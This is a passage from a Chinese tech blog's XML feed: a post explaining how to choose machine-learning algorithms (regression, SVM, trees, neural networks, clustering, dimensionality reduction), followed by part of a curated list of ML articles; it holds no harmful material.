<li><a href="https://www.rootusers.com/how-to-increase-the-size-of-a-linux-lvm-by-adding-a-new-disk/">How to Increase the size of a Linux LVM by adding a new disk</a></li>
<li><a href="https://askubuntu.com/questions/934947/unable-to-add-physical-volume-dev-hda-to-volume-group">Unable to add physical volume ‘/dev/hda’ to volume group</a></li>
<li><a href="http://www.cnblogs.com/gaojun/archive/2012/08/22/2650229.html">Linux LVM硬盘管理及LVM扩容</a></li>
<li><a href="https://docs.oracle.com/cd/E26926_01/html/E25884/fscreate-6.html">创建和挂载 Oracle Solaris 文件系统</a></li>
<li><a href="http://www.sansky.net/article/2007-12-03-iscsi-storage.html">iSCSI存储技术全攻略|2007</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2018/10/exfat.html">exFAT 文件系统指南</a></li>
<li><a href="https://opensource.com/article/19/3/virtual-filesystems-linux">Virtual filesystems in Linux: Why we need them and how they work</a></li>
<li><a href="https://achainofblocks.com/2018/10/05/ipfs-interplanetary-file-system-simply-explained/">IPFS The Interplanetary File System | Simply Explained</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>架构师</tag>
      </tags>
  </entry>
  <entry>
    <title>AI技术原理|如何选择机器学习算法？</title>
    <url>/2018/04/02/Machine-Learning-Algorithms-Sheet/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>识别和应用机器学习算法解决问题</li>
<li>机器学习算法备忘单</li>
<li>何时使用特定算法? 线性回归 vs 逻辑回归,Linear SVM vs kernel SVM,Trees</li>
<li>神经网络和深度学习：k-means/k-modes,GMM,Hierarchical clustering,PCA,SVD,LDA</li>
</ul>
<span id="more"></span>
<h2 id="Machine-Learning-Algorithms-Overview"><a href="#Machine-Learning-Algorithms-Overview" class="headerlink" title="Machine Learning Algorithms Overview"></a>Machine Learning Algorithms Overview</h2><p>关于目前最流行的一些机器学习算法，建议阅读：</p>
<ul>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
</ul>
<p>如果您已经非常熟悉这些算法，可以跳过本节。</p>
<h2 id="Which-machine-learning-algorithm-should-I-use"><a href="#Which-machine-learning-algorithm-should-I-use" class="headerlink" title="Which machine learning algorithm should I use?"></a>Which machine learning algorithm should I use?</h2><ul>
<li><a href="https://blogs.sas.com/content/subconsciousmusings/2017/04/12/machine-learning-algorithm-use/?utm_source=twitter&amp;utm_medium=cpc&amp;utm_campaign=analytics-global&amp;utm_content=US_tap">Which machine learning algorithm should I use? | Hui Li | Principal Staff Scientist, Data Science</a></li>
</ul>
<p>面对各种机器学习算法时，经常遇到的一个典型问题是“我应该使用哪种算法？” 问题的答案取决于许多因素，其中包括：</p>
<ul>
<li>数据的大小，质量和性质</li>
<li>可用的计算时间</li>
<li>任务的紧迫性</li>
<li>你想对数据做什么</li>
</ul>
<p>即使是一位经验丰富的数据科学家，也无法在尝试不同的算法之前知道哪种算法会表现最好。我们并不主张这是唯一的、完美的方案，而是希望能够根据一些明确的因素提供指导——首先应该尝试哪些算法。</p>
<h3 id="机器学习算法备忘单"><a href="#机器学习算法备忘单" class="headerlink" title="机器学习算法备忘单"></a>机器学习算法备忘单</h3><p>机器学习算法备忘单（The machine learning algorithm cheat sheet）可以帮助您从各种机器学习算法中进行选择，以找到适合您的特定问题的适当算法。本文将说明使用备忘单的过程。</p>
<p>由于备忘单是为初学者数据科学家和分析师设计的，因此在讨论算法时会做一些简化假设。这里推荐的算法来自几位数据科学家和机器学习专家和开发人员的反馈和提示。有几个问题我们的看法并不一致，对于这些问题，我们试图强调通用性、尽量调和差异。随着我们的知识库发展，将包含一套更完整的方法，其他算法将在稍后添加。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/machine-learning-cheet-sheet.png" alt="The machine learning algorithm cheat sheet"></p>
<h4 id="如何使用备忘单"><a href="#如何使用备忘单" class="headerlink" title="如何使用备忘单"></a>如何使用备忘单</h4><p>备忘单使用方法，依次阅读的路径和算法标签，例如：</p>
<ul>
<li>如果要执行降维（dimension reduction），则使用主成分分析（principal component analysis）</li>
<li>如果您需要快速进行数值预测（numeric prediction），请使用决策树（decision tree）或逻辑回归（ logistic regression）</li>
<li>如果您需要分层结果，则使用分层聚类（hierarchical clustering）</li>
</ul>
<p>有些场景可能会适用不止一个分支，也有些场景不能完美匹配上，重要的是要记住，这些路径只是基于经验的方法，因此一些建议并不完全准确。许多数据科学家的关电视，找到最好算法的唯一方法就是尝试所有算法（the only sure way to find the very best algorithm is to try all of them）。</p>
<h2 id="何时使用特定算法"><a href="#何时使用特定算法" class="headerlink" title="何时使用特定算法?"></a>何时使用特定算法?</h2><h4 id="线性回归-vs-逻辑回归"><a href="#线性回归-vs-逻辑回归" class="headerlink" title="线性回归 vs 逻辑回归"></a>线性回归 vs 逻辑回归</h4><p>线性回归是一种讨论连续因变量之间关系的建模方法。如果因变量不是连续的而是分类的，则可以使用 logit link function 将线性回归转化为逻辑回归。逻辑回归是一种简单，快速而强大的分类算法。这里我们讨论二进制情况下的因变量</p>
<p>在逻辑回归中，我们使用不同的假设类来尝试预测给定示例属于“1”类的概率与其属于“-1”类的概率。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>线性回归</th>
<th>逻辑回归</th>
</tr>
</thead>
<tbody>
<tr>
<td><img src="http://riboseyim-qiniu.riboseyim.com/machine-learning-linear-regression.png" alt="Linear regression"></td>
<td><img src="http://riboseyim-qiniu.riboseyim.com/machine-learning-logistic-regresion.png" alt="Logistic regression"></td>
</tr>
</tbody>
</table>
</div>
<h4 id="Linear-SVM-vs-kernel-SVM"><a href="#Linear-SVM-vs-kernel-SVM" class="headerlink" title="Linear SVM vs kernel SVM"></a>Linear SVM vs kernel SVM</h4><p>当数据的各种类型不是线性可分的时候，核方法（Kernel method 或 Kernel tricks）可以用来将非线性可分的空间映射到更高维的线性可分的空间。</p>
<p>支持向量机（SVM）算法相当于通过法线（Normal vector）和超平面偏差（bias  of the hyperplane）获得分类器。这个超平面（边界）尽可能宽地分隔不同的类，该问题可以转化为约束优化问题。</p>
<p>当大多数因变量是数字时，逻辑回归和 SVM 是首先应该尝试的分类方法。这些模型易于实现，参数易调整，性能也相当不错。非常适合初学者。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/machine-learning-kernal-SVM.png" alt="Kernel tricks are used to map a non-linearly separable functions into a higher dimension linearly separable function."></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>线性回归</th>
<th>逻辑回归</th>
</tr>
</thead>
<tbody>
<tr>
<td><img src="http://riboseyim-qiniu.riboseyim.com/machine-learning-Group-By-Linear-Regression.jpg" alt="Group By Linear Regression"></td>
<td><img src="http://riboseyim-qiniu.riboseyim.com/machine-learning-Logistic-Regression-SAS.jpg" alt="machine-learning-Logistic-Regression-SAS"></td>
</tr>
</tbody>
</table>
</div>
<h4 id="树-Tree"><a href="#树-Tree" class="headerlink" title="树 | Tree"></a>树 | Tree</h4><ul>
<li>预测模型中的决策树</li>
</ul>
<p>决策树（Decision Tree），随机森林（Random Forest）和梯度提升（Gradient Boosting ）都是基于决策树的算法。决策树有许多变体，但它们都做同样的事情 - 将特征空间细分成大多数标签相同的区域。决策树很容易理解和实施。但是，当我们耗尽树枝（branch）并且深入时，它们倾向于过度拟合数据。随机森林和梯度提升是两种使用树算法的实现，具有良好的精确度，是克服过拟合问题（over-fitting problem）的流行方法。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/machine-learning-decision-tree.png" alt="A decision tree for prediction model"></p>
<p>注：在统计学中，过拟合（overfitting，或称过度拟合）现象是指在拟合一个统计模型时，使用过多参数。对比于可获取的数据总量来说，一个荒谬的模型只要足够复杂，是可以完美地适应数据。过拟合一般可以视为违反奥卡姆剃刀原则。当可选择的参数的自由度超过数据所包含信息内容时，这会导致最后（拟合后）模型使用任意的参数，这会减少或破坏模型一般化的能力（目标效果应适用于一般化的情况而非只是训练时所使用的现有数据（根据它的归纳偏向））。另一种常见的现象是使用太少参数，以致于不适应数据，这则称为乏适（underfitting，或称：拟合不足）现象。</p>
<h3 id="神经网络和深度学习"><a href="#神经网络和深度学习" class="headerlink" title="神经网络和深度学习"></a>神经网络和深度学习</h3><p><img src="http://riboseyim-qiniu.riboseyim.com/machine-learning-cnn-architecture.jpg" alt="A convolution neural network architecture"></p>
<p>神经网络在 20 世纪 80 年代中期由于其并行和分布式处理能力而兴旺发达。但是在这个领域的研究受反向传播算法无效性的阻碍，它广泛用于优化神经网络参数。支持向量机（SVM）和其他更简单的模型，可以通过求解凸优化问题来轻松训练，逐渐取代机器学习中的神经网络。</p>
<p>近年来，诸如无监督预训练（ unsupervised pre-training）和分层贪婪训练（layer-wise greedy training）等新的和改进的训练技术促进了神经网络的复兴。日益强大的计算能力，例如图形处理单元（GPU）和大规模并行处理（MPP），也刺激了神经网络的发展，已经发明出具有数千层的神经网络模型。</p>
<p>注：反向传播（Backpropagation，缩写 BP）是“误差反向传播”的简称，一种与最优化方法（如梯度下降法）结合使用的，用来训练人工神经网络的常见方法。该方法对网络中所有权重计算损失函数的梯度。这个梯度会反馈给最优化方法，用来更新权值以最小化损失函数。</p>
<h3 id="SAS-Visual-Analytics-中的神经网络"><a href="#SAS-Visual-Analytics-中的神经网络" class="headerlink" title="SAS Visual Analytics 中的神经网络"></a>SAS Visual Analytics 中的神经网络</h3><p>换句话说，浅层神经网络已演变成深度学习神经网络。深度神经网络对于监督学习非常成功。当用于语音和图像识别时，深度学习的表现与人类一样好，甚至更好。应用于无监督学习任务（如特征提取），深度学习还可从原始图像或语音中提取特征，而人工干预则更少。</p>
<p>神经网络由三部分组成：输入层（input layer），隐藏层（hidden layers）和输出层（output layer）。训练样本定义了输入层和输出层。当输出层是一个分类变量时，神经网络就是解决分类问题的一种方法。当输出层是连续变量时，网络可以用来做回归。当输出层与输入层相同时，网络可用于提取内在特征。隐藏层的数量决定了模型的复杂性和建模容量。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/machine-learning-vdmml_neural.png" alt="A neural network in SAS Visual Analytics"></p>
<h4 id="k-means-k-modes，GMM（高斯混合模型）聚类"><a href="#k-means-k-modes，GMM（高斯混合模型）聚类" class="headerlink" title="k-means / k-modes，GMM（高斯混合模型）聚类"></a>k-means / k-modes，GMM（高斯混合模型）聚类</h4><p>k-means / k-modes，GMM 聚类旨在将 n 个观测分为 k 个聚类。 简单地说，k-means 的结果是每个数据点被 assign 到其中某一个 cluster 了，即 hard  assignment，而 GMM 则给出这些数据点被 assign 到每个cluster 的概率，又称作 soft assignment 。每个样本都有与每个群集关联的概率。当给定聚类数 k 时，两种算法都足够简单快速地进行聚类。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>k-means</th>
<th>GMM</th>
</tr>
</thead>
<tbody>
<tr>
<td><img src="http://riboseyim-qiniu.riboseyim.com/machine-learning-kmeans-clustering-1.png" alt="K Means Clustering"></td>
<td><img src="http://riboseyim-qiniu.riboseyim.com/machine-learning-gaussianmixturemodel-1.png" alt="Gaussian Mixture Model"></td>
</tr>
</tbody>
</table>
</div>
<h4 id="DBSCAN-基于密度的空间聚类"><a href="#DBSCAN-基于密度的空间聚类" class="headerlink" title="DBSCAN | 基于密度的空间聚类"></a>DBSCAN | 基于密度的空间聚类</h4><p>DBSCAN ，Density-based spatial clustering of applications with noise ，是在 1996 年由 Martin Ester 等提出的聚类分析算法， 这个算法是以密度为本的：给定某空间里的一个点集合，该算法能把附近的点分成一组（有很多相邻点的点），并标记出位于低密度区域的局外点（最接近它的点也十分远），DBSCAN 是一个最常用的聚类分析算法。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/machine-learning-dbscan.jpg" alt="A DBSCAN illustration"></p>
<h4 id="Hierarchical-clustering-分层聚类"><a href="#Hierarchical-clustering-分层聚类" class="headerlink" title="Hierarchical clustering | 分层聚类"></a>Hierarchical clustering | 分层聚类</h4><p>分层分区可以使用树结构（树状图）可视化。它不需要集群的数量作为输入，并且可以使用不同的 K 来在不同粒度级别处查看分区（即精炼/粗化集群  refine/coarsen clusters）。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/machine-learning-Hierarchical_clustering.png" alt="Hierarchical clustering"></p>
<h4 id="PCA，SVD和LDA"><a href="#PCA，SVD和LDA" class="headerlink" title="PCA，SVD和LDA"></a>PCA，SVD和LDA</h4><p>我们通常不希望直接将大量特征提供给机器学习算法，因为某些特征可能无关紧要，或者“内在”维度可能小于特征的数量。主成分分析（PCA，Principal components analysis），奇异值分解（SVD，Singular value decomposition）和隐含狄利克雷分布（LDA，latent Dirichlet allocation）均可用于降维。</p>
<p>PCA 是一种无监督聚类方法，它将原始数据空间映射到较低维空间，同时保留尽可能多的信息。 PCA 基本上找到最能保留数据方差的子空间，子空间由数据协方差矩阵的主要特征向量定义。</p>
<p>SVD 和 PCA 有一定联系——中心数据矩阵的 SVD（特征 vs. 样本）能提供定义由 PCA 所找到的同样子空间的主左奇异向量（dominant left singular vectors）。然而，SVD 是一种更通用的技术，因为它也可以做 PCA 不能做的事情。例如，用户与电影矩阵的 SVD 能够提取可以在推荐系统中使用的用户资料和电影资料。另外，在自然语言处理（NLP）中，SVD 还被广泛用作主题建模工具，称为潜在语义分析（ latent semantic analysis ）。</p>
<p>NLP 中的相关技术是隐含狄利克雷分布（ LDA ）。 LDA 是概率性主题模型，它以与高斯混合模型（GMM）相似的方式，即将连续数据按照高斯密度分解——将文档分解为主题。与 GMM 不同的是，LDA 对离散数据（文档中的词）进行建模，并且它约束了主题需是根据狄利克雷分布的先验分布。</p>
<h2 id="总结：选择算法时的注意事项"><a href="#总结：选择算法时的注意事项" class="headerlink" title="总结：选择算法时的注意事项"></a>总结：选择算法时的注意事项</h2><p>选择算法时请始终考虑以下方面：准确性（accuracy），训练时间（training time）和易用性（ease of use）。许多用户将准确性放在首位，而 <strong>初学者倾向于关注他们最熟悉的算法（Beginners tend to focus on algorithms they know best）</strong>。</p>
<p>首先要考虑的是如何获得结果，无论结果如何。<strong>初学者倾向于选择易于实现并能够快速获得结果的算法（Beginners tend to choose algorithms that are easy to implement and can obtain results quickly）</strong>。这个工作无可厚非，只需确保它只是整个过程的第一步。一旦您获得了一些结果并熟悉数据，您可能需要花更多时间、使用更复杂的算法来加强对数据的理解，从而进一步改进结果。</p>
<p>最好的算法也许不是那些已经获得最高准确率的方法，因为算法通常需要仔细调整、广泛训练才可以实现可用性方面的最佳性能。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Machine-Learning-Master》"><a href="#《The-Machine-Learning-Master》" class="headerlink" title="《The Machine Learning Master》"></a><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h4><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://blogs.sas.com/content/subconsciousmusings/2017/04/12/machine-learning-algorithm-use/?utm_source=twitter&amp;utm_medium=cpc&amp;utm_campaign=analytics-global&amp;utm_content=US_tap">Which machine learning algorithm should I use? | Hui Li | Principal Staff Scientist, Data Science</a></li>
<li><a href="https://arxiv.org/pdf/1302.1552.pdf">An Information-Theoretic Analysis of Hard and Soft Assignment Methods for Clustering </a></li>
<li><a href="http://www.iro.umontreal.ca/~lisa/pointeurs/BengioNips2006All.pdf">Greedy Layer-Wise Training of Deep Networks</a></li>
<li><a href="https://blogs.sas.com/content/subconsciousmusings/2018/03/09/understanding-interpreting-data-set/">Understanding and interpreting your data set  1</a></li>
<li><a href="http://www.kernel-machines.org/publications/pdfs/0701907.pdf">KERNEL METHODS IN MACHINE LEARNING1 |By Thomas Hofmann, Bernhard Scholkopf and Alexander J. Smola</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>架构师</tag>
        <tag>数学与算法</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>AI技术原理|推荐文献</title>
    <url>/2018/02/09/Machine-Learning-Articles/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>机器学习参考文集</li>
<li>Machine Learning 资讯 | 基于深度学习识别姑息治疗患者</li>
<li>Machine Learning Top Articles<span id="more"></span>
</li>
</ul>
<blockquote>
<p>“Hiring a Machine Learning engineer or Data Scientist in Silicon Valley is becoming like hiring a professional athlete. That’s how demanding it is” — The New York Times</p>
</blockquote>
<h2 id="Popular-Ai-Articles"><a href="#Popular-Ai-Articles" class="headerlink" title="Popular Ai Articles:"></a>Popular Ai Articles:</h2><ol>
<li>A noob’s guide to implementing RNN-LSTM using Tensorflow</li>
<li>Keras Cheat Sheet: Neural Networks in Python</li>
<li>Making a Simple Neural Network</li>
</ol>
<h2 id="Machine-Learning-Top-Articles"><a href="#Machine-Learning-Top-Articles" class="headerlink" title="Machine Learning Top Articles"></a>Machine Learning Top Articles</h2><ul>
<li><p><a href="https://medium.mybridge.co/learn-to-build-a-machine-learning-application-from-top-articles-of-2017-cdd5638453fc">Learn to Build a Machine Learning Application from Top Articles of 2017</a></p>
</li>
<li><p><strong>Paper</strong> <a href="http://download.tensorflow.org/paper/whitepaper2015.pdf">TensorFlow:Large-Scale Machine Learning on Heterogeneous Distributed Systems (Preliminary White Paper, November 9, 2015)</a></p>
</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML-News-201802-1.png" alt=""></p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul>
<li><a href="#">图像处理 Image Manipulation</a></li>
<li><a href="#">风格转换 Style Transfer</a></li>
<li><a href="#">图像分类 Image Classification</a></li>
<li><a href="#">脸部识别 Face Recognition</a></li>
<li><a href="#">视频稳定化 Video Stabilization</a></li>
<li><a href="#">目标检测 Object Detection</a></li>
<li><a href="#">自动驾驶汽车 Self Driving Car</a></li>
<li><a href="#">智能推荐 Recommendation Al</a></li>
<li><a href="#">智能游戏 Gaming Al</a></li>
<li><a href="#">智能下棋 Chess Al</a></li>
<li><a href="#">智能医学 Medical Al</a></li>
<li><a href="#">智能演说 Speech Al</a></li>
<li><a href="#">智能音乐 Music Al</a></li>
<li><a href="#">自然语言处理 Natural Language Processing</a></li>
<li><a href="#">智能预测 Prediction</a></li>
</ul>
<p><br></p>
<p>Mybridge AI  在 20000 篇关于创建机器学习应用的文章中挑选了前 50 名。从有实践经验的数据科学家那里学习是一个好方法，我们可以的分享中获得构建、运营机器学习应用的经验教训。50 篇文章大致可以分为 15 个主题，如下所示：</p>
<h3 id="Recommended-Learning"><a href="#Recommended-Learning" class="headerlink" title="Recommended Learning"></a>Recommended Learning</h3><ul>
<li><a href="http://bit.ly/2nbsc5n">The Beginner’s Guide to Building an Artificial Intelligence in Unity.</a></li>
<li><a href="http://bit.ly/2naZ4vg">Deep Learning and Computer Vision A-Z™: Learn OpenCV, SSD &amp; GANs and create image recognition apps.</a></li>
</ul>
<p><br></p>
<h3 id="图像处理-Image-Manipulation"><a href="#图像处理-Image-Manipulation" class="headerlink" title="图像处理 Image Manipulation"></a>图像处理 Image Manipulation</h3><ul>
<li><a href="https://tcwang0509.github.io/pix2pixHD?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">High-Resolution Image Synthesis and Semantic Manipulation with Conditional GANs</a></li>
<li><a href="https://research.googleblog.com/2017/07/using-deep-learning-to-create.html?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Using Deep Learning to Create Professional-Level Photographs</a></li>
<li><a href="https://www.learnopencv.com/high-dynamic-range-hdr-imaging-using-opencv-cpp-python?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">High Dynamic Range (HDR) Imaging using OpenCV (Python)</a></li>
</ul>
<p><br></p>
<h3 id="风格转换-Style-Transfer"><a href="#风格转换-Style-Transfer" class="headerlink" title="风格转换 Style Transfer"></a>风格转换 Style Transfer</h3><ul>
<li><a href="https://arxiv.org/abs/1705.01088?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Visual Attribute Transfer through Deep Image Analogy</a></li>
<li><a href="https://arxiv.org/abs/1703.07511?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Deep Photo Style Transfer: A deep-learning approach to photographic style transfer that handles a large variety of image content while faithfully transferring the reference style</a></li>
<li><a href="https://dmitryulyanov.github.io/deep_image_prior?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Deep Image Prior</a></li>
</ul>
<p><br></p>
<h3 id="图像分类-Image-Classification"><a href="#图像分类-Image-Classification" class="headerlink" title="图像分类 Image Classification"></a>图像分类 Image Classification</h3><ul>
<li><a href="https://distill.pub/2017/feature-visualization?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Feature Visualization: How neural networks build up their understanding of images</a></li>
<li><a href="https://github.com/humphd/have-fun-with-machine-learning?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">An absolute beginner’s guide to Image Classification with Neural Networks</a></li>
<li><a href="https://medium.com/towards-data-science/background-removal-with-deep-learning-c4f2104b3157?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Background removal with deep learning</a></li>
</ul>
<p><br></p>
<h3 id="人脸识别-Face-Recognition"><a href="#人脸识别-Face-Recognition" class="headerlink" title="人脸识别 Face Recognition"></a>人脸识别 Face Recognition</h3><ul>
<li><a href="http://aaronsplace.co.uk/papers/jackson2017recon?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Large Pose 3D Face Reconstruction from a Single Image via Direct Volumetric CNN Regression</a></li>
<li><a href="http://www.pyimagesearch.com/2017/04/24/eye-blink-detection-opencv-python-dlib?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Eye blink detection with OpenCV, Python, and dlib</a></li>
<li><a href="https://www.makeartwithpython.com/blog/deal-with-it-generator-face-recognition?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">DEAL WITH IT in Python with Face Detection</a></li>
</ul>
<p><br></p>
<h3 id="视频稳定化-Video-Stabilization"><a href="#视频稳定化-Video-Stabilization" class="headerlink" title="视频稳定化 Video Stabilization"></a>视频稳定化 Video Stabilization</h3><ul>
<li><a href="https://research.googleblog.com/2017/11/fused-video-stabilization-on-pixel-2.html?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Fused Video Stabilization on the Pixel 2 and Pixel 2 XL</a></li>
</ul>
<p><br></p>
<h3 id="目标检测-Object-Detection"><a href="#目标检测-Object-Detection" class="headerlink" title="目标检测 Object Detection"></a>目标检测 Object Detection</h3><ul>
<li><a href="https://hackernoon.com/how-hbos-silicon-valley-built-not-hotdog-with-mobile-tensorflow-keras-react-native-ef03260747f3?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">How HBO’s Silicon Valley built “Not Hotdog” with mobile TensorFlow, Keras &amp; React Native</a></li>
<li><a href="https://tryolabs.com/blog/2017/08/30/object-detection-an-overview-in-the-age-of-deep-learning?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Object detection: an overview in the age of Deep Learning</a></li>
<li><a href="https://medium.com/towards-data-science/how-to-train-your-own-object-detector-with-tensorflows-object-detector-api-bec72ecfe1d9?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">How to train your own Object Detector with TensorFlow’s Object Detector API</a></li>
<li><a href="http://www.pyimagesearch.com/2017/09/18/real-time-object-detection-with-deep-learning-and-opencv?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Real-time object detection with deep learning and OpenCV</a></li>
</ul>
<p><br></p>
<h3 id="自动驾驶汽车-Self-Driving-Car"><a href="#自动驾驶汽车-Self-Driving-Car" class="headerlink" title="自动驾驶汽车 Self Driving Car"></a>自动驾驶汽车 Self Driving Car</h3><ul>
<li><a href="https://www.youtube.com/watch?v=ks4MPfMq8aQ?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Self-driving Grand Theft Auto V with Python : Intro [Part I] - Sentdex</a></li>
<li><a href="https://medium.freecodecamp.com/recognizing-traffic-lights-with-deep-learning-23dae23287cc?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Recognizing Traffic Lights With Deep Learning: How I learned deep learning in 10 weeks and won $5,000</a></li>
</ul>
<p><br></p>
<h3 id="智能推荐-Recommendation-AI"><a href="#智能推荐-Recommendation-AI" class="headerlink" title="智能推荐 Recommendation AI"></a>智能推荐 Recommendation AI</h3><ul>
<li><a href="https://hackernoon.com/spotifys-discover-weekly-how-machine-learning-finds-your-new-music-19a41ab76efe?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Spotify’s Discover Weekly: How machine learning finds your new music</a></li>
<li><a href="https://medium.com/netflix-techblog/artwork-personalization-c589f074ad76?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Artwork Personalization at Netflix</a></li>
</ul>
<p><br></p>
<h3 id="智能游戏-Gaming-AI"><a href="#智能游戏-Gaming-AI" class="headerlink" title="智能游戏 Gaming AI"></a>智能游戏 Gaming AI</h3><ul>
<li><a href="https://www.youtube.com/watch?v=Ipi40cb_RsI?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">MariFlow - Self-Driving Mario Kart w/Recurrent Neural Network</a></li>
<li><a href="https://blog.openai.com/openai-baselines-dqn?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">OpenAI Baselines: DQN. Reproduce reinforcement learning algorithms with performance on par with published results.</a></li>
<li><a href="https://blog.openai.com/more-on-dota-2?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Reinforcement Learning on Dota 2 [Part II]</a></li>
<li><a href="https://www.codelitt.com/blog/doom-ai?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Creating an AI DOOM bot</a></li>
<li><a href="http://theorangeduck.com/page/phase-functioned-neural-networks-character-control?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Phase-Functioned Neural Networks for Character Control</a></li>
<li><a href="https://arxiv.org/abs/1702.05663?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">The Game Imitation: Deep Supervised Convolutional Networks for Quick Video Game AI - Stanford University</a></li>
<li><a href="https://blogs.unity3d.com/2017/09/19/introducing-unity-machine-learning-agents?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Introducing: Unity Machine Learning Agents – Unity Blog</a></li>
</ul>
<p><br></p>
<h3 id="智能下棋-Chess-AI"><a href="#智能下棋-Chess-AI" class="headerlink" title="智能下棋 Chess AI"></a>智能下棋 Chess AI</h3><ul>
<li><a href="https://arxiv.org/abs/1712.01815?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Mastering Chess and Shogi by Self-Play with a General Reinforcement Learning Algorithm</a></li>
<li><a href="https://deepmind.com/blog/alphago-zero-learning-scratch?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">AlphaGo Zero: Learning from scratch | DeepMind</a></li>
<li><a href="https://www.youtube.com/watch?v=vC66XFoN4DE?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">How Does DeepMind’s AlphaGo Zero Work?</a></li>
<li><a href="https://medium.freecodecamp.com/simple-chess-ai-step-by-step-1d55a9266977?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">A step-by-step guide to building a simple chess AI</a></li>
</ul>
<p><br></p>
<h3 id="智能医学-Medical-AI"><a href="#智能医学-Medical-AI" class="headerlink" title="智能医学 Medical AI"></a>智能医学 Medical AI</h3><ul>
<li><a href="https://stanfordmlgroup.github.io/projects/chexnet?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">CheXNet: Radiologist-Level Pneumonia Detection on Chest X-Rays with Deep Learning</a></li>
